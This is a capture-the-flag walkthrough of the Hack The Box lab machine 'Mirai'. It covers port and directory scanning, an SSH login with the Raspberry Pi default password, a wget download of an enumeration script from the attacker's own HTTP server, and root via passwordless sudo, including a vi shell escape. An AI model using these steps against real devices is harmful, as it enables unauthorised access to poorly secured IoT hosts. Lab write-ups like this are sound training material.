# Hackthebox Mirai


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

We perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Mon Oct 22 18:46:24 2018 as: nmap -v -sV -p- -oA mirai_full_tcp -T4 10.10.10.48
Nmap scan report for 10.10.10.48
Host is up (0.038s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp    open  domain  dnsmasq 2.76
80/tcp    open  http    lighttpd 1.4.35
1763/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

At the same time we start a more extensive vulnerability scan, scanning all tcp ports and services for vulns

```
nmap -v -sV -p- --script vuln -T4 10.10.10.48

Nmap scan report for 10.10.10.48                                                                                                                                                                             
Host is up (0.038s latency).                                                                                                                                                                                 
Not shown: 65529 closed ports                                                                                                                                                                                
PORT      STATE SERVICE VERSION                                                                                                                                                                              
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)                                                                                                                                         
53/tcp    open  domain  dnsmasq 2.76                                                                                                                                                                         
80/tcp    open  http    lighttpd 1.4.35                                                                                                                                                                      
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                                        
|_http-server-header: lighttpd/1.4.35                                                                                                                                                                        
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                                             
1763/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)                                                                                                                                       
32400/tcp open  http    Plex Media Server httpd                                                                                                                                                              
| http-cross-domain-policy:                                                                                                                                                                                  
|   VULNERABLE:                                                                                                                                                                                              
|   Cross-domain and Client Access policies.                                                                                                                                                                 
|     State: VULNERABLE
|       A cross-domain policy file specifies the permissions that a web client such as Java, Adobe Flash, Adobe Reader,
|       etc. use to access data across different domains. A client acces policy file is similar to cross-domain policy
|       but is used for M$ Silverlight applications. Overly permissive configurations enables Cross-site Request
|       Forgery attacks, and may allow third parties to access sensitive data meant for the user.
|     Check results:
|       /crossdomain.xml:
|         <?xml version="1.0"?>
|         <!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
|         <cross-domain-policy>
|           <site-control permitted-cross-domain-policies="all"/>
|           <allow-access-from domain="*" secure="false"/>
|           <allow-http-request-headers-from domain="*" headers="SOAPAction,Content-Type"/>
|         </cross-domain-policy>
|       /clientaccesspolicy.xml:
|         <?xml version="1.0" encoding="utf-8"?>
|         <access-policy>
|           <cross-domain-access>
|             <policy>
|               <allow-from http-request-headers="*">
|                 <domain uri="*"/>
|               </allow-from>
|               <grant-to>
|                 <resource path="/" include-subpaths="true"/>
|               </grant-to>
|             </policy>
|           </cross-domain-access>
|         </access-policy>
|     Extra information:
|       Trusted domains:*, *, *
|_http-iis-webdav-vuln: Could not determine vulnerability, since root folder is password protected
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals multiple interesting services. 

Lets check the webserver at port 80. Visiting this in a browser reveals a white page. 

So lets do some content discovery on the page using gobuster.

```
root@kali:~/htb/mirai# gobuster -u http://10.10.10.48 -w /usr/share/wordlists/SecLists/Discovery/Web-C
ontent/raft-large-directories.txt -o gobuster_initial.scan

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.48/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/10/22 20:39:37 Starting gobuster
=====================================================
/admin (Status: 301)
/versions (Status: 200)
=====================================================
2018/10/22 20:43:48 Finished
=====================================================
```

We find two interesting pages. Visting the /admin page we can clearly see that this is a Pi-hole application.


## Initial Compromise


The first open service we found was ssh. By now we can assume that this box is a raspberry Pi. The name "Mirai" also gives us a hint of our next step. 
The Mirai botnet is known for compromising IoT devices using default credentials and then building a huge botnet.

Googling for default credentials for Raspberry PI devices indicates that a default account named "pi" with the password "raspberry" could work.

So let's try that.

We use SSH to try to connect to the device:

```
root@kali:~/htb/mirai# ssh pi@10.10.10.48
Unable to negotiate with 10.10.10.48 port 22: no matching key exchange method found. Their offer: curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1
```

We get an error message saying that no matching key exchange method found. We can get around this error by adding a flag to our command.

```
root@kali:~/htb/mirai# ssh pi@10.10.10.48 -oKexAlgorithms=+diffie-hellman-group1-sha1
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


pi@raspberrypi:~ $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
```
We get a un-privileged access using the credentials.

## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits in our privesc may require a full TTY to work. Trust me, I have learned this the hard way.

At this point we have valid credentials and a nice ssh shell that is fully responsive, so we have a pretty good foothold.


## Privilege Escalation


To avoid writing any file to disk I move to the /dev/shm folder. So what is /dev/shm? "Linux 2.6 kernel builds have started to offer /dev/shm as shared memory in the form of a ramdisk, more specifically as a world-writable directory that is stored in memory with a defined limit in /etc/default/tmpfs."

We transfer our files to the victim over http by setting up a local webserver in the directory that we have our privesc scripts:

```
root@kali:~/tools/privesc# python -m SimpleHTTPServer                                                
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.48 - - [22/Oct/2018 21:01:28] "GET /LinEnum.sh HTTP/1.1" 200 
```

I then use wget to download the files on the victim.

```
pi@raspberrypi:/dev/shm $ wget http://10.10.14.7:8000/LinEnum.sh
converted 'http://10.10.14.7:8000/LinEnum.sh' (ANSI_X3.4-1968) -> 'http://10.10.14.7:8000/LinEnum.sh' (UTF-8)                                                                                               
--2018-10-22 19:01:15--  http://10.10.14.7:8000/LinEnum.sh
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47066 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh                100%[=====================================>]  45.96K  --.-KB/s   in 0.1s

2018-10-22 19:01:15 (416 KB/s) - 'LinEnum.sh' saved [47066/47066]

pi@raspberrypi:/dev/shm $ chmod +x LinEnum.sh
```

Running the privesc-script and going through its output, I note the following interesting information:

```
[+] We can sudo without supplying a password!
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

and

```
[-] Location and contents (if accessible) of .bash_history file(s):
/home/pi/.bash_history

ifconfig
sudo su
```

So we can use sudo without any password. This is bad. We also see in the bash history that the user has used sudo to change to the root user.

We can use sudo to get root in multiple ways.

```
pi@raspberrypi:/dev/shm $ sudo su
root@raspberrypi:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

 We can also use vi for example:

```
pi@raspberrypi:/dev/shm $ sudo vi
:!sh 
# id
uid=0(root) gid=0(root) groups=0(root)
```
